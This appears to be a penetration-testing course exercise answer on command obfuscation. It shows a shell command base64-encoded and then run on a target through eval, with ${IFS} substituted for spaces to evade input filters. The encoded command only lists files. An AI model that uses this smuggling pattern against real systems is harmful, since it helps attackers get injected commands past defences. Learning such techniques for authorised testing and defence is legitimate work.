## Advanced Command Obfuscation

### Assessments: 

**Assessment # 1:**
Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1 

```bash

# base64 encode the command in local machine
echo 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64

# On the target machine, decode and execute
eval${IFS}$(base64${IFS}-d<<<'ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEK')
```